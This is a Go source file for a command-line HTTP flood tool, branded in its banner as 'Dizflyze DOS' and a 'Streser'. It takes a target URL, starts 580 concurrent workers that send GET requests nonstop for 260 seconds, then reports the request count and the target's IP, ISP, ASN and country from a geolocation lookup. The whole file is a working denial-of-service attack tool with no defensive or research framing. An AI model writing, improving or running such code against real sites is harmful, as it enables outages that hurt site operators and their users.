package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    startTime   = time.Now()
    requests    int64
    concurrency = 580
)

const (
    P  = "\033[0m"
    R    = "\033[31m"
    G  = "\033[32m"
    Y = "\033[33m"
    B   = "\033[34m"
    C   = "\033[36m"
)

func L() {
    fmt.Println(P + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 JAN
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
` + P)
}

func D(ip string) (isp, asn, country string) {
    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Get("http://ip-api.com/json/" + ip)
    if err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    defer resp.Body.Close()

    type ipApiResponse struct {
        Country string `json:"country"`
        Org     string `json:"org"`
        AS      string `json:"as"`
    }

    var data ipApiResponse
    if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    return data.Org, data.AS, data.Country
}

func I(host string) string {
    ips, err := net.LookupIP(host)
    if err != nil || len(ips) == 0 {
        return "Unknown"
    }
    return ips[0].String()
}

func A(url string, duration time.Duration, wg *sync.WaitGroup, stopChan chan struct{}) {
    defer wg.Done()
    client := &http.Client{Timeout: 2 * time.Second}
    endTime := time.Now().Add(duration)
    for {
        select {
        case <-stopChan:
            return
        default:
            req, err := http.NewRequest("GET", url, nil)
            if err != nil {
                continue
            }
            _, err = client.Do(req)
            if err == nil {
                atomic.AddInt64(&requests, 1)
            }
            if time.Now().After(endTime) {
                return
            }
        }
    }
}

func main() {
    L()
    reader := bufio.NewReader(os.Stdin)
    fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
    url, _ := reader.ReadString('\n')
    url = strings.TrimSpace(url)

    durasi := 260 * time.Second
    var wg sync.WaitGroup
    stopChan := make(chan struct{})

    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go A(url, durasi, &wg, stopChan)
    }

    time.Sleep(durasi)
    close(stopChan)
    wg.Wait()

    elapsed := time.Since(startTime)
    host := HI(url)
    hostIP := I(host)
    ispHost, asnHost, countryHost := D(hostIP)

    L()
    fmt.Println(R + "╔════════════════════════════════════════════════╗" + P)
    fmt.Printf("%s│%s Link   : %s%s\n", R, P, Y, url)
    fmt.Printf("%s│%s Host    : %s%s\n", R, P, Y, host)
    fmt.Printf("%s│%s Ip      : %s%s\n", R, P, Y, hostIP)
    fmt.Printf("%s│%s Isp     : %s%s\n", R, P, C, ispHost)
    fmt.Printf("%s│%s Asn     : %s%s\n", R, P, C, asnHost)
    fmt.Printf("%s│%s Country : %s%s\n", R, P, C, countryHost)
    fmt.Printf("%s│%s Duration: %s\n", R, P, elapsed)
    fmt.Printf("%s│%s Requests: %s%d\n", R, P, Y, requests)
    fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
}

func HI(url string) string {
    parts := strings.Split(url, "/")
    if len(parts) >= 3 {
        return parts[2]
    }
    return url
}
